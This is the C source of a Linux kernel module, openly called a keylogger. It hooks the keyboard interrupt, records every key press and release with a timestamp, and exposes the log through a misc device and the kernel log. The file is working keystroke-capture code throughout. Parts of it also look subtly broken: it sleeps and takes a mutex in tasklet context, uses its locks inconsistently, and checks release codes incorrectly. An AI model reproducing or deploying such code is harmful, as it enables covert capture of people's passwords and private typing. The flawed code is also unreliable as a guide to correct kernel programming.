#include "keylogger.h"
/*
static void keyboard_tasklet(struct tasklet_struct *tasklet)
{
	unsigned char			scancode;
	struct key_display_format	*kdf = NULL;
	ktime_t			tv;

	scancode = inb(KEYBOARD_PORT);
	unsigned char state = (scancode & RELEASED_MASK) ? 1 : 0;
	memset(kdf, 0, sizeof(struct key_display_format));

//	 
	  * checking for the key we by the keycode received
	  * faster to separate on state from the beginning
	  * than checking each iteration : keycodes[i].released && keycodes[i].pressed
//	  
	int i = 0;
	if (state) {
		while (i < 86 && scancode != keycodes[i].released)
			i++;
	} else {
		while (i < 86 && scancode != keycodes[i].pressed)
			i++;
	}

	// unlikely, but better be safe than sorry
	if (scancode != keycodes[i].pressed)
		return;

	// Alloc + assignation + add to list
	if (!(kdf = kmalloc(sizeof(struct key_display_format), GFP_KERNEL)))
		return;

	do_settimeofday64(&tv);
	time64_to_tm(tv.tv_sec, HOUR, &kdf->time);
	memmove(kdf->key, keycodes[i].key, strlen(keycodes[i].key));
	kdf->scancode = scancode;
	kdf->state = state;
}
*/

static void keyboard_tasklet(struct tasklet_struct *tasklet)
{
	unsigned char scancode;
	struct key_display_format *kdf = NULL;
	struct timespec64 ts;

	scancode = inb(KEYBOARD_PORT);
	unsigned char state = (scancode & RELEASED_MASK) ? 1 : 0;

	/*
	 * checking for the key we by the keycode received
	 * faster to separate on state from the beginning
	 * than checking each iteration : keycodes[i].released && keycodes[i].pressed
	 */
	int i = 0;
	if (state)
	{
		while (i < 86 && scancode != keycodes[i].released)
			i++;
		pr_info("key released -> code(%x)\n", scancode);
	}
	else
	{
		while (i < 86 && scancode != keycodes[i].pressed)
			i++;
		pr_info("key pressed -> code(%x)\n", scancode);
	}

	// unlikely, but better be safe than sorry
	if (scancode != keycodes[i].pressed)
		return;

	// Alloc + assignation + add to list
	if (!(kdf = kmalloc(sizeof(struct key_display_format), GFP_KERNEL)))
		return;
	memset(kdf, 0, sizeof(struct key_display_format));

	ktime_get_real_ts64(&ts);
	time64_to_tm(ts.tv_sec, HOUR, &kdf->time);
	memmove(kdf->key, keycodes[i].key, strlen(keycodes[i].key));
	kdf->scancode = scancode;
	kdf->state = state;

	mutex_lock(&tasklet_lock);
	list_add_tail(&kdf->list, &keylist);
	mutex_unlock(&tasklet_lock);
}


static irqreturn_t keyboard_interrupt(int irq, void *dev_id)
{
	tasklet_schedule(&kbd_tasklet);

	return IRQ_HANDLED;
}


/*
 *
 * MISC - OPEN - READ - RELEASE
 *
 */

static int misc_read(struct seq_file *seq, void *ptr)
{
	struct key_display_format *kdf = NULL;
	
	read_lock(&misc_lock);
	list_for_each_entry(kdf, &keylist, list)
	{
		seq_printf(seq, "%02d:%02d:%02d  %-13s (%#.2x) %s\n", 
				kdf->time.tm_hour,
				kdf->time.tm_min,
				kdf->time.tm_sec,
				kdf->key,
				kdf->scancode,
				(kdf->state) ? "RELEASED" : "PRESSED");
	}
	read_unlock(&misc_lock);

	return 0;
}

static int misc_open(struct inode *inode, struct file *file)
{
	/*
	 * Seq open does not use private_data, and will throw an WARN_ON
	 * if not set to null.
	 */
	file->private_data = NULL;

	return single_open(file, misc_read, NULL);
}

static int misc_release(struct inode *inode, struct file *file)
{
	return single_release(inode, file);
}


/*
 *
 * CONSTRUCT - DESTRUCT
 *
 */

static int __init initialization(void)
{
	int ret;

	ret = request_irq(IRQ_NUM,
			keyboard_interrupt,
			IRQF_SHARED,
			IRQ_NAME,
			dev_id);
	if (ret)
	{
		pr_err("keylogger: could not register irq: %d\n", ret);
		return ret;
	}
	if (misc_register(&miscdev))
	{
		free_irq(IRQ_NUM, dev_id);
		pr_err("could not register misc device");
		return -EINVAL;
	}

	pr_info("Keylogger: irq registered\n");
	return 0;
}

static void __exit cleanup(void)
{
	const struct key_display_format	*cur;
	const struct key_display_format *tmp;

	free_irq(IRQ_NUM, dev_id);
	tasklet_kill(&kbd_tasklet);
	list_for_each_entry_safe(cur, tmp, &keylist, list)
		kfree(cur);
	misc_deregister(&miscdev);
	pr_info("keylogger: goodbye !\n");
}

module_init(initialization);
module_exit(cleanup);

